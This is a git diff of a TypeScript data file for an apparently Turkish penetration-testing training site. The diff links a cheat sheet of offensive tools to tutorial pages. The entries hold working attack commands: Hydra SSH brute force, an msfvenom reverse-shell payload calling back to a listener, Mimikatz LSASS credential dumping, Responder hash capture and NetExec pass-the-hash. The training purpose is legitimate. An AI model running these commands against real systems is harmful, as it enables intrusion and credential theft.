@@ -7,6 +7,7 @@ export interface ArsenalTool {
   desc: string;
   cmd: string;
   tip?: string;
+  href?: string; // Detaylı eğitim sayfası (Red Team modülü)
 }
 export interface ArsenalQA { q: string; a: string; }
 export interface ArsenalCategory {
@@ -27,18 +28,21 @@ export const arsenal: ArsenalCategory[] = [
     tools: [
       {
         name: "enum4linux",
+        href: "/red-team/enum4linux",
         desc: "Windows ve Samba sistemlerinden kullanıcı, paylaşım ve politika bilgilerini toplar.",
         cmd: "enum4linux -a 10.10.10.1",
         tip: "-a tüm temel enumeration'ı (kullanıcı, grup, paylaşım, parola politikası) çalıştırır.",
       },
       {
         name: "Nikto",
+        href: "/red-team/nikto",
         desc: "Web sunucularındaki potansiyel zafiyetleri, eski sürüm yazılımları ve yanlış yapılandırmaları tarar.",
         cmd: "nikto -h http://10.10.10.1",
         tip: "Gürültülüdür — IDS/WAF tarafından kolayca tespit edilir, lab/izinli testte kullan.",
       },
       {
         name: "WPScan",
+        href: "/red-team/wpscan",
         desc: "WordPress tabanlı sitelerde eklenti, tema ve kullanıcı zafiyetlerini tespit eder.",
         cmd: "wpscan --url https://hedef.com --enumerate u,vp",
         tip: "u=kullanıcılar, vp=zafiyetli eklentiler. Zafiyet verisi için --api-token gerekir.",
@@ -58,18 +62,21 @@ export const arsenal: ArsenalCategory[] = [
     tools: [
       {
         name: "Hydra",
+        href: "/red-team/hydra",
         desc: "Çevrimiçi (online) brute force saldırıları için kullanılır; SSH, FTP, HTTP, SMB gibi protokolleri destekler.",
         cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1",
         tip: "-l tek kullanıcı, -L kullanıcı listesi; -P parola listesi. Online olduğu için yavaş ve gürültülüdür.",
       },
       {
         name: "John the Ripper",
+        href: "/red-team/john",
         desc: "Çevrimdışı (offline) parola kırma ve hash analizinde sektör standartlarındandır.",
         cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
         tip: "Kırılanları görmek için: john --show hash.txt. Tür belirtmek hızlandırır: --format=...",
       },
       {
         name: "Hashcat",
+        href: "/red-team/hashcat",
         desc: "Ekran kartı (GPU) gücünü kullanarak çok hızlı hash kırma işlemleri yapar.",
         cmd: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
         tip: "-m hash türü (0=MD5, 1000=NTLM, 1800=sha512crypt), -a 0 sözlük saldırısı.",
@@ -89,18 +96,21 @@ export const arsenal: ArsenalCategory[] = [
     tools: [
       {
         name: "DirBuster",
+        href: "/red-team/gobuster",
         desc: "Web sunucularında gizli dizin ve dosyaları kelime listeleriyle (wordlist) bulan grafik arayüzlü araçtır.",
         cmd: "dirbuster -H -u http://10.10.10.1/ -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
         tip: "-H başsız (headless) mod. Genelde GUI ile kullanılır; konsol için Gobuster/ffuf tercih edilir.",
       },
       {
         name: "Gobuster",
+        href: "/red-team/gobuster",
         desc: "DirBuster'ın konsol tabanlı, Go diliyle yazılmış çok daha hızlı alternatifidir.",
         cmd: "gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50",
         tip: "-t 50 paralel iş parçacığı sayısı. dns ve vhost modları da vardır.",
       },
       {
         name: "ffuf",
+        href: "/red-team/ffuf",
         desc: "Son derece hızlı, esnek ve özelleştirilebilir bir web fuzzer aracıdır.",
         cmd: "ffuf -u http://10.10.10.1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
         tip: "FUZZ kelimesi nereye yazılırsa orası fuzzlanır (parametre, başlık, vhost). -fc 404 ile filtrele.",
@@ -120,18 +130,21 @@ export const arsenal: ArsenalCategory[] = [
     tools: [
       {
         name: "LinPEAS / WinPEAS",
+        href: "/red-team/linux-privesc",
         desc: "Linux ve Windows sistemlerinde yetki yükseltme vektörlerini otomatik tarayan scriptlerdir.",
         cmd: "./linpeas.sh | tee linpeas_sonuc.txt",
         tip: "Çıktıda kırmızı/sarı vurgulananlara odaklan. WinPEAS: winpeas.exe (veya .bat).",
       },
       {
         name: "Metasploit Framework",
+        href: "/red-team/metasploit",
         desc: "Exploit test etme, çalıştırma ve payload oluşturma için kapsamlı sızma testi platformudur.",
         cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe",
         tip: "msfvenom payload üretir; dinleyici için msfconsole'da exploit/multi/handler kullanılır.",
       },
       {
         name: "Mimikatz",
+        href: "/red-team/windows-privesc",
         desc: "Windows bellek (LSASS) üzerinden düz metin parola, hash ve bilet bilgilerini çıkarır.",
         cmd: "privilege::debug\nsekurlsa::logonpasswords",
         tip: "Önce privilege::debug, sonra sekurlsa::logonpasswords. Admin/SYSTEM yetkisi gerekir.",
@@ -151,18 +164,21 @@ export const arsenal: ArsenalCategory[] = [
     tools: [
       {
         name: "BloodHound",
+        href: "/red-team/bloodhound",
         desc: "Active Directory ortamlarındaki karmaşık ilişkileri ve yetki yükseltme yollarını grafiksel olarak haritalandırır.",
         cmd: "bloodhound-python -d domain.local -u kullanici -p 'Parola1' -c All -ns 10.10.10.1",
         tip: "Toplanan veri BloodHound GUI'ye yüklenir; 'Shortest Path to Domain Admins' sorgusu en değerlisidir.",
       },
       {
         name: "Responder",
+        href: "/red-team/responder",
         desc: "Yerel ağda LLMNR, NBT-NS ve mDNS zehirlenmesi yaparak kullanıcı hash'lerini yakalar.",
         cmd: "sudo responder -I eth0 -dwv",
         tip: "Yakalanan NetNTLMv2 hash'leri Hashcat (-m 5600) ile kırılabilir veya relay edilebilir.",
       },
       {
         name: "NetExec (CrackMapExec)",
+        href: "/red-team/netexec",
         desc: "İç ağlarda numaralandırma ve yanal hareket (lateral movement) için İsviçre çakısı görevi görür.",
         cmd: "netexec smb 10.10.10.0/24 -u kullanici -p 'Parola1' --shares",
         tip: "Parola yerine -H ile hash kullanılarak Pass-the-Hash yapılabilir. CrackMapExec'in devamıdır.",
